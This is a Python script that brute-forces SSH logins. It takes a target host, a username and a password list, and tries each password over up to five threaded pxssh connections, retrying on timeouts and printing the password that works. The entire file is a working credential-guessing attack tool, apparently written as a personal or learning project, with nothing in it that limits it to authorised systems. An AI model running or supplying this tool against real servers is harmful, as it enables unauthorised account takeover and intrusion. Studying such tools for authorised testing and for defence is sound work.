# author: axi0m
# purpose: ssh bruteforcer using pxssh instead of pexpect - More modular
# usage: sshBrute.py --host 10.10.10.10 --user root -F password.txt
# example: sshBrute.py
# changelog: 12/17/18 - initial creation
# changelog: 02/12/19 - finished working prototype

'''
To Do:
Use asyncio over threading module
Migrate to f-string formatting
Explore using fabric instead of pxssh
'''

from pexpect import pxssh
import argparse
import time
from threading import BoundedSemaphore
from threading import Thread
import sys

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: {}'.format(password))
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host',nargs='?', action="store", dest="host", help="The host to target for scanning.")
    parser.add_argument('--user',nargs='?', action="store", dest="user", help="The username to brute-force.")
    parser.add_argument('--file',nargs='?', default="passwordlist.txt", action="store", dest="passfile", help="The    password list to reference.")

    args = parser.parse_args()

    host = args.host
    passfile = args.passfile
    user = args.user

    if host is None or passfile is None or user is None:
        parser.print_help()

    with open(passfile, 'r') as passList:
        for line in passList.readlines():
            if Found:
                print('[+] Exiting: Password Found')
                sys.exit()
            if Fails > 5:
                print('[!] Exiting: Too many socket timeouts.')
                sys.exit(1)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print('[-] Testing: {}'.format(password))
            t = Thread(target=connect, args=(host, user, password, True))
            child = t.start()


if __name__ == '__main__':
    main()
